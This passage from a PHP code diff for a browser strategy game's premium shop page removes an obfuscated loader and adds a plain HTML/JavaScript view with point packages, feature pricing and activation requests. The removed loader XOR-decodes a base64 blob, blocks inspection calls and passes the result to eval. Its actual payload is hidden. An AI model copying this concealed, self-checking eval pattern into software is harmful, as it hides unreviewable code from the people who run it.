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";
-$sgowsbvz=file_get_contents(__FILE__);
-$sdglmtk=str_replace($kwsrkfam,"",$sgowsbvz);
-if(strpos($sdglmtk,"ec"."ho")!==false||strpos($sdglmtk,"pr"."int")!==false||strpos($sdglmtk,"var_"."dump")!==false||strpos($sdglmtk,"file_put_"."contents")!==false||strpos($sdglmtk,"fw"."rite")!==false){die();}
-$hlusata=str_replace(array($toknisd,$emgfxlyu),array("SP_dde19f82","KP_f9ffbdd6"),$sgowsbvz);
-$nbmiipnzwrh=md5($hlusata);
-$vsvarq=hex2bin($emgfxlyu);
-$kudbfixa="";
-$fpvmackiy=strlen($nbmiipnzwrh);
-for($lruhldg=0;$lruhldg<$fpvmackiy;$lruhldg++){
-$kudbfixa.=chr(ord($vsvarq[$lruhldg])^ord($nbmiipnzwrh[$lruhldg]));
-}
-$xrxfjw=base64_decode($kwsrkfam);
-$gfycvdg=strlen($xrxfjw);
-$etqqriah="";
-$tlxgjbjj=strlen($kudbfixa);
-for($lruhldg=0;$lruhldg<$gfycvdg;$lruhldg++){
-$etqqriah.=$xrxfjw[$lruhldg]^$kudbfixa[$lruhldg%$tlxgjbjj];
-}
-$nsqtzqxnj="gzun"."compress";
-eval('?>' . $nsqtzqxnj($etqqriah) . '<?php ');
+/**
+ * Premium Screen View
+ * Display premium features and purchase options
+ */
+?>
+
+<!-- Include Name Cosmetics CSS -->
+<link rel="stylesheet" href="/css/name_cosmetics.css">
+
+
+<!-- Purchase Modal -->
+<div id="purchaseModal"
+    style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 9999;">
+    <div
+        style="position: relative; width: 920px; margin: 50px auto; background: url('/graphic/premium/modal_bg.jpg'); border: 3px solid #8B4513; border-radius: 10px; padding: 20px;">
+        <!-- Close Button -->
+        <button onclick="closePurchaseModal()"
+            style="position: absolute; top: 10px; right: 10px; background: #8B4513; color: white; border: none; width: 30px; height: 30px; border-radius: 50%; cursor: pointer; font-size: 18px;">✕</button>
+
+        <h2 style="text-align: center; color: white; text-shadow: 2px 2px 4px #000;">
+            <?= __('screens.premium.get_premium_points') ?>
+        </h2>
+
+        <!-- Premium Packages -->
+        <div style="display: flex; justify-content: space-around; margin: 30px 0;">
+            <!-- 200 Points -->
+            <div
+                style="background: linear-gradient(180deg, #8B0000 0%, #4B0000 100%); border: 3px solid #FFD700; border-radius: 10px; padding: 15px; width: 160px; text-align: center;">
+                <div style="color: white; font-size: 48px; font-weight: bold; text-shadow: 2px 2px 4px #000;">200</div>
+                <div style="color: #FFD700; font-weight: bold;"><?= __('screens.premium.premium_point') ?></div>
+                <div style="margin: 20px 0;">
+                    <img src="/graphic/new/premium/coinbag_15x15.png" alt="Coins" style="width: 100px; height: 100px;" />
+                </div>
+                <div style="background: #8B4513; color: white; padding: 8px; border-radius: 5px; font-weight: bold;">
+                    3,99 €</div>
+            </div>
+
+            <!-- 600 Points -->
+            <div
+                style="background: linear-gradient(180deg, #006400 0%, #003200 100%); border: 3px solid #FFD700; border-radius: 10px; padding: 15px; width: 160px; text-align: center; position: relative;">
+                <div
+                    style="position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: green; color: white; padding: 3px 10px; border-radius: 5px; font-size: 12px;">
+                    500 + 20%</div>
+                <div style="color: white; font-size: 48px; font-weight: bold; text-shadow: 2px 2px 4px #000;">600</div>
+                <div style="color: #FFD700; font-weight: bold;">Ponto Premium</div>
+                <div style="margin: 20px 0;">
+                    <img src="/graphic/new/premium/product_03.png" alt="Coins" style="width: 100px; height: 100px;" />
+                </div>
+                <div style="background: #8B4513; color: white; padding: 8px; border-radius: 5px; font-weight: bold;">
+                    9,99 €</div>
+            </div>
+
+            <!-- 1500 Points - Most Popular -->
+            <div
+                style="background: linear-gradient(180deg, #006400 0%, #003200 100%); border: 3px solid #FFD700; border-radius: 10px; padding: 15px; width: 160px; text-align: center; position: relative;">
+                <div
+                    style="position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: green; color: white; padding: 3px 10px; border-radius: 5px; font-size: 12px;">
+                    1000 + 50%</div>
+                <div style="color: white; font-size: 48px; font-weight: bold; text-shadow: 2px 2px 4px #000;">1500</div>
+                <div style="color: #FFD700; font-weight: bold;">Ponto Premium</div>
+                <div style="margin: 20px 0;">
+                    <img src="/graphic/new/premium/product_03.png" alt="Coins" style="width: 100px; height: 100px;" />
+                </div>
+                <div style="background: #00008B; color: white; padding: 8px; border-radius: 5px; font-weight: bold;">
+                    <?= __('screens.premium.most_popular') ?>
+                </div>
+                <div
+                    style="background: #8B4513; color: white; padding: 8px; border-radius: 5px; font-weight: bold; margin-top: 5px;">
+                    19,99 €</div>
+            </div>
+
+            <!-- 5000 Points -->
+            <div
+                style="background: linear-gradient(180deg, #006400 0%, #003200 100%); border: 3px solid #FFD700; border-radius: 10px; padding: 15px; width: 160px; text-align: center; position: relative;">
+                <div
+                    style="position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: green; color: white; padding: 3px 10px; border-radius: 5px; font-size: 12px;">
+                    2500 + 100%</div>
+                <div style="color: white; font-size: 48px; font-weight: bold; text-shadow: 2px 2px 4px #000;">5000</div>
+                <div style="color: #FFD700; font-weight: bold;">Ponto Premium</div>
+                <div style="margin: 20px 0;">
+                    <img src="/graphic/new/premium/product_04.png" alt="Coins" style="width: 100px; height: 100px;" />
+                </div>
+                <div style="background: #8B4513; color: white; padding: 8px; border-radius: 5px; font-weight: bold;">
+                    49,99 €</div>
+            </div>
+
+            <!-- 8500 Points -->
+            <div
+                style="background: linear-gradient(180deg, #006400 0%, #003200 100%); border: 3px solid #FFD700; border-radius: 10px; padding: 15px; width: 160px; text-align: center; position: relative;">
+                <div
+                    style="position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: green; color: white; padding: 3px 10px; border-radius: 5px; font-size: 12px;">
+                    4000 + 112%</div>
+                <div style="color: white; font-size: 48px; font-weight: bold; text-shadow: 2px 2px 4px #000;">8500</div>
+                <div style="color: #FFD700; font-weight: bold;">Ponto Premium</div>
+                <div style="margin: 20px 0;">
+                    <img src="/graphic/new/premium/product_05.png" alt="Coins" style="width: 100px; height: 100px;" />
+                </div>
+                <div style="background: #8B4513; color: white; padding: 8px; border-radius: 5px; font-weight: bold;">
+                    79,99 €</div>
+            </div>
+        </div>
+
+        <!-- Removed village scene image as it doesn't exist -->
+
+        <!-- Payment Method -->
+        <div style="background: rgba(139, 69, 19, 0.8); padding: 15px; border-radius: 5px;">
+            <div style="color: white; margin-bottom: 10px;"><?= __('screens.premium.how_to_pay') ?></div>
+            <div style="display: flex; align-items: center; gap: 20px;">
+                <div style="background: white; padding: 10px; border-radius: 5px; flex: 1;">
+                    <img src="/graphic/new/premium/paypal.png" alt="PayPal" style="height: 30px;" />
+                    <select style="width: 100%; padding: 5px; margin-top: 5px;">
+                        <option>PayPal</option>
+                    </select>
+                </div>
+                <div>
+                    <label style="color: white;">
+                        <input type="checkbox" /> <?= __('screens.premium.save_account') ?>
+                    </label>
+                </div>
+                <span
+                    style="background: #FFD700; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; display: inline-block;">?</span>
+            </div>
+        </div>
+
+        <!-- Footer Links -->
+        <div style="text-align: center; margin-top: 20px; font-size: 11px;">
+            <a href="game.php?village=<?= $village['id'] ?>&screen=support" style="color: #FFD700; margin: 0 10px;"><?= __('screens.premium.support_request') ?></a>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=terms" style="color: #FFD700; margin: 0 10px;"><?= __('screens.premium.general_terms') ?></a>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=privacy" style="color: #FFD700; margin: 0 10px;"><?= __('screens.premium.data_protection') ?></a>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=legal" style="color: #FFD700; margin: 0 10px;"><?= __('screens.premium.legal_info') ?></a>
+            <div style="color: white; margin-top: 5px;"><?= __('screens.premium.prices_include_tax') ?></div>
+        </div>
+    </div>
+</div>
+
+<!-- Cosmetic Purchase Result Modal -->
+<div id="cosmeticResultModal"
+    style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10001;">
+    <div
+        style="position: relative; width: 450px; margin: 150px auto; background: #f4e4bc; border: 3px solid #8b4513; border-radius: 10px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
+        <!-- Header -->
+        <h3 id="resultModalTitle" style="text-align: center; margin-bottom: 20px; font-size: 22px;"></h3>
+
+        <!-- Content -->
+        <div id="resultModalContent" style="text-align: center; font-size: 16px; line-height: 1.6; color: #333;"></div>
+
+        <!-- OK Button -->
+        <div style="text-align: center; margin-top: 25px;">
+            <button onclick="closeResultModal()"
+                style="background: #27ae60; color: white; border: none; padding: 12px 40px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold;">OK</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Global variables
+    // window.currentUsername = <?= json_encode(isset($user["username"]) ? $user["username"] : "Guest") ?>;
+    window.currentUsername = "TestUser"; // Temporary hardcoded value
+</script>
+
+<script>
+    function openPurchaseModal() {
+        document.getElementById('purchaseModal').style.display = 'block';
+    }
+
+    function closePurchaseModal() {
+        document.getElementById('purchaseModal').style.display = 'none';
+    }
+
+    // Activate premium feature
+    // Calculate cost based on feature and duration
+    function calculateCost(feature, duration) {
+        const pricing = {
+            'account_manager': {
+                3: 30,
+                7: 60,
+                14: 100,
+                30: 200,
+                90: 600
+            },
+            'farm_assistant': {
+                30: 30,
+                90: 90
+            },
+            'wood_production': {
+                30: 150,
+                90: 450
+            },
+            'clay_production': {
+                30: 150,
+                90: 450
+            },
+            'iron_production': {
+                30: 150,
+                90: 450
+            }
+        };
+
+        return pricing[feature]?.[duration] || 0;
+    }
+
+    // Activate premium feature
+    function activateFeature(feature, duration, cost) {
+        // Recalculate cost to ensure it's correct
+        const actualCost = calculateCost(feature, parseInt(duration));
+        showActivationModal(feature, duration, actualCost);
+    }
+
+    // Feature activation modal functions
+    let pendingActivation = null;
+
+    function showActivationModal(feature, duration, cost) {
+        const featureNames = {
+            'account_manager': 'Gestor de conta',
+            'farm_assistant': 'Assistente de Saque',
+            'wood_production': '+20% produção de madeira',
+            'clay_production': '+20% produção de argila',
+            'iron_production': '+20% produção de ferro'
+        };
+
+        const featureName = featureNames[feature] || feature;
+
+        document.getElementById('activationFeatureName').textContent = featureName;
+        document.getElementById('activationDuration').textContent = duration;
+        document.getElementById('activationCost').textContent = cost;
+
+        pendingActivation = { feature, duration, cost };
+        document.getElementById('activationModal').style.display = 'flex';
+    }
+
+    function closeActivationModal() {
+        document.getElementById('activationModal').style.display = 'none';
+        pendingActivation = null;
+    }
+
+    function confirmActivation() {
+        console.log('confirmActivation called', pendingActivation);
+        if (!pendingActivation) {
+            console.error('No pending activation!');
+            return;
+        }
+
+        const { feature, duration } = pendingActivation;
+        console.log('Activating:', feature, 'for', duration, 'days');
+
+        const formData = new FormData();
+        formData.append('action', 'activate');
+        formData.append('feature', feature);
+        formData.append('duration', duration);
+
+        console.log('Sending request...');
+        fetch(window.location.href, {
+            method: 'POST',
+            body: formData
+        })
+            .then(response => {
+                console.log('Response received:', response.status);
+                return response.json();
+            })
+            .then(data => {
+                console.log('Response data:', data);
+                if (data.success) {
+                    alert('✅ ' + data.message);
+                    console.log('Reloading page...');
+                    location.reload();
+                } else {
+                    alert('❌ ' + data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Erro ao ativar funcionalidade: ' + error.message);
+            });
+
+        closeActivationModal();
+    }
+
+    // Toggle auto-renewal for premium features
+    function toggleAutoRenew(feature, enabled) {
+        const formData = new FormData();
+        formData.append('action', 'toggle_auto_renew');
+        formData.append('feature', feature);
+        formData.append('enabled', enabled ? '1' : '0');
+
+        fetch(window.location.href, {
+            method: 'POST',
+            body: formData
+        })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log('Auto-renewal updated:', data.message);
+                } else {
+                    alert('❌ Erro: ' + data.message);
+                    // Revert checkbox state on error
+                    document.getElementById('auto_renew_' + feature.replace('_', '')).checked = !enabled;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Erro ao atualizar renovação automática');
+                // Revert checkbox state on error
+                document.getElementById('auto_renew_' + feature.replace('_', '')).checked = !enabled;
+            });
+    }
+</script>
+
+<!-- Premium Feature Activation Confirmation Modal -->
+<div id="activationModal"
+    style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 10000; align-items: center; justify-content: center;">
+    <div class="popup_box" style="width: 450px; background: #f4e4bc; border: 2px solid #8b4513;">
+        <h3 style="text-align: center; margin-bottom: 20px; color: #8b4513;">
+            <?= __('screens.premium.confirm_activation') ?>
+        </h3>
+
+        <div style="padding: 20px; text-align: center; background: #f4e4bc;">
+            <p style="font-size: 16px; margin-bottom: 15px; color: #000;">
+                <?= __('screens.premium.activate') ?> "<strong><span id="activationFeatureName"></span></strong>"
+                <?= __('screens.premium.for') ?> <strong><span id="activationDuration"></span>
+                    <?= __('screens.premium.days') ?></strong>?
+            </p>
+
+            <p style="font-size: 14px; color: #666; margin-bottom: 25px;">
+                <?= __('screens.premium.cost') ?> <img src="/graphic/new/premium/coinbag_15x15.png"
+                    style="vertical-align: middle;" /> <strong><span id="activationCost"></span>
+                    <?= __('screens.premium.premium_points') ?></strong>
+            </p>
+
+            <div style="display: flex; gap: 10px; justify-content: center;">
+                <button onclick="confirmActivation()" class="btn"
+                    style="background: #5cb85c; color: white; padding: 8px 30px;">
+                    OK
+                </button>
+                <button onclick="closeActivationModal()" class="btn"
+                    style="background: #999; color: white; padding: 8px 30px;">
+                    <?= __('screens.premium.cancel') ?>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<h2><?= __('screens.premium.premium') ?></h2>
+
+<div style="float: right; font-size: 18px; font-weight: bold;">
+    <img src="/graphic/new/premium/coinbag_15x15.png" alt="Pontos" style="vertical-align: middle;" />
+    <?= number_format($premium_points) ?> <?= __('screens.premium.points') ?>
+</div>
+
+<div style="clear: both;"></div>
+
+<!-- Tabs -->
+<table class="vis" width="100%">
+    <tr>
+        <?php foreach ($tabs as $tab_key => $tab_name): ?>
+            <th <?= $tab === $tab_key ? 'class="selected"' : '' ?>>
+                <?php if ($tab_key === 'buy'): ?>
+                    <a href="#" onclick="openPremiumModal(); return false;">
+                        <?= $tab_name ?>
+                    </a>
+                <?php else: ?>
